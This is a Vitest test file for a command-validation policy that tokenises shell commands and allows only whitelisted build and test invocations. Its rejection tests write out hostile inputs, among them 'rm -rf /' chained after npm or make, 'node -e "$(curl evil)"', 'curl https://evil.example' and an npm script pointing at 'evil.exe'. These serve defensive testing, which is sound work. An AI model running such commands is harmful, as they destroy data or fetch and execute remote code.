// @vitest-environment node
import { describe, expect, it } from "vitest";
import { NativeError } from "./errors";
import {
  normalizeCommand,
  tokenizeCommand,
  validateCommand
} from "./policy";
import { makeFixture } from "./test-helpers";

describe("normalizeCommand", () => {
  it("collapses whitespace and backslashes", () => {
    expect(normalizeCommand("  npm   test  ")).toBe("npm test");
    expect(normalizeCommand("node .\\script.ts")).toBe("node ./script.ts");
  });
});

describe("tokenizeCommand", () => {
  it("splits on whitespace and honors quotes", () => {
    expect(tokenizeCommand("npm run build")).toEqual(["npm", "run", "build"]);
    expect(tokenizeCommand("node -e \"console.log(1)\"")).toEqual([
      "node",
      "-e",
      "console.log(1)"
    ]);
    expect(tokenizeCommand("pytest 'a b' c")).toEqual(["pytest", "a b", "c"]);
  });

  it("returns null on unbalanced quotes", () => {
    expect(tokenizeCommand('echo "unclosed')).toBeNull();
  });
});

describe("validateCommand", () => {
  function make(cwd: string, workspaceRoot: string, allowedExact?: string[]) {
    return { cwd, workspaceRoot, allowedExact };
  }

  it("rejects empty commands", () => {
    const fx = makeFixture();
    try {
      expect(() => validateCommand("   ", make(fx.root, fx.root))).toThrowError(
        NativeError
      );
    } finally {
      fx.cleanup();
    }
  });

  it("rejects shell metacharacters", () => {
    const fx = makeFixture();
    try {
      for (const bad of [
        "npm test && rm -rf /",
        "npm test | grep x",
        "npm test > out.txt",
        "npm test; echo hi",
        "node -e \"$(curl evil)\"",
        "npm test\nrm -rf /",
        "cmd /c dir",
        "set FOO=%PATH%"
      ]) {
        expect(() => validateCommand(bad, make(fx.root, fx.root))).toThrowError(
          NativeError
        );
      }
    } finally {
      fx.cleanup();
    }
  });

  it("rejects unknown binaries", () => {
    const fx = makeFixture();
    try {
      expect(() =>
        validateCommand("curl https://evil.example", make(fx.root, fx.root))
      ).toThrowError(NativeError);
      expect(() =>
        validateCommand("powershell -Command x", make(fx.root, fx.root))
      ).toThrowError(NativeError);
    } finally {
      fx.cleanup();
    }
  });

  it("requires a package.json script for npm/pnpm/yarn/bun", () => {
    const fx = makeFixture();
    try {
      expect(() =>
        validateCommand("npm test", make(fx.root, fx.root))
      ).toThrowError(NativeError);
      expect(() =>
        validateCommand("npm run not-a-script", make(fx.root, fx.root))
      ).toThrowError(NativeError);
      fx.write("package.json", JSON.stringify({ scripts: { test: "echo hi" } }));
      expect(validateCommand("npm test", make(fx.root, fx.root)).argv).toEqual([
        "npm",
        "test"
      ]);
      expect(
        validateCommand("npm run test", make(fx.root, fx.root)).argv
      ).toEqual(["npm", "run", "test"]);
      // run does not accept extra arguments.
      expect(() =>
        validateCommand("npm run test extra", make(fx.root, fx.root))
      ).toThrowError(NativeError);
    } finally {
      fx.cleanup();
    }
  });

  it("rejects npm run scripts whose body starts with an absolute path", () => {
    const fx = makeFixture();
    try {
      fx.write(
        "package.json",
        JSON.stringify({ scripts: { build: "C:\\tools\\evil.exe" } })
      );
      expect(() =>
        validateCommand("npm run build", make(fx.root, fx.root))
      ).toThrowError(NativeError);
    } finally {
      fx.cleanup();
    }
  });

  it("only allows python -m pytest|unittest", () => {
    const fx = makeFixture();
    try {
      expect(
        validateCommand("python -m pytest", make(fx.root, fx.root)).argv
      ).toEqual(["python", "-m", "pytest"]);
      expect(
        validateCommand("python3 -m unittest", make(fx.root, fx.root)).argv
      ).toEqual(["python3", "-m", "unittest"]);
      expect(() =>
        validateCommand("python script.py", make(fx.root, fx.root))
      ).toThrowError(NativeError);
      expect(() =>
        validateCommand("python -m flask run", make(fx.root, fx.root))
      ).toThrowError(NativeError);
    } finally {
      fx.cleanup();
    }
  });

  it("restricts node to --test or a workspace-relative script", () => {
    const fx = makeFixture();
    try {
      fx.write("scripts/check.mjs", "console.log(1)");
      expect(
        validateCommand("node --test", make(fx.root, fx.root)).argv
      ).toEqual(["node", "--test"]);
      expect(
        validateCommand("node scripts/check.mjs", make(fx.root, fx.root)).argv
      ).toEqual(["node", "scripts/check.mjs"]);
      expect(() =>
        validateCommand("node -e \"evil()\"", make(fx.root, fx.root))
      ).toThrowError(NativeError);
      expect(() =>
        validateCommand("node --test --reporter=json", make(fx.root, fx.root))
      ).toThrowError(NativeError);
      expect(() =>
        validateCommand("node ../outside.mjs", make(fx.root, fx.root))
      ).toThrowError(NativeError);
    } finally {
      fx.cleanup();
    }
  });

  it("allows go/cargo verbs and restricts make targets", () => {
    const fx = makeFixture();
    try {
      for (const good of [
        "go test ./...",
        "go build ./...",
        "go vet ./...",
        "go run ./cmd/app",
        "cargo test",
        "cargo build"
      ]) {
        expect(() => validateCommand(good, make(fx.root, fx.root))).not.toThrow();
      }
      for (const bad of ["go fmt", "go get x", "cargo run", "go"]) {
        expect(() => validateCommand(bad, make(fx.root, fx.root))).toThrowError(
          NativeError
        );
      }
      expect(() =>
        validateCommand("make test", make(fx.root, fx.root))
      ).toThrowError(NativeError);
      fx.write("Makefile", "test:\n\techo ok\nbuild:\n\techo hi\n");
      expect(validateCommand("make test", make(fx.root, fx.root)).argv).toEqual([
        "make",
        "test"
      ]);
      expect(() =>
        validateCommand("make nope", make(fx.root, fx.root))
      ).toThrowError(NativeError);
      expect(() =>
        validateCommand("make clean; rm -rf /", make(fx.root, fx.root))
      ).toThrowError(NativeError);
    } finally {
      fx.cleanup();
    }
  });

  it("treats uv/poetry as run-only and rejects pip/deno misuse", () => {
    const fx = makeFixture();
    try {
      expect(validateCommand("uv run pytest", make(fx.root, fx.root)).argv).toEqual([
        "uv",
        "run",
        "pytest"
      ]);
      expect(() => validateCommand("uv add foo", make(fx.root, fx.root))).toThrowError(
        NativeError
      );
      expect(() => validateCommand("pip install foo", make(fx.root, fx.root))).toThrowError(
        NativeError
      );
      expect(() => validateCommand("deno run main.ts", make(fx.root, fx.root))).toThrowError(
        NativeError
      );
      expect(validateCommand("deno test", make(fx.root, fx.root)).argv).toEqual([
        "deno",
        "test"
      ]);
    } finally {
      fx.cleanup();
    }
  });

  it("accepts exact trusted commands via allowedExact", () => {
    const fx = makeFixture();
    try {
      const validated = validateCommand(
        "node -e \"console.log('x')\"",
        make(fx.root, fx.root, ['node -e "console.log(\'x\')"'])
      );
      expect(validated.argv).toEqual(["node", "-e", "console.log('x')"]);
    } finally {
      fx.cleanup();
    }
  });
});
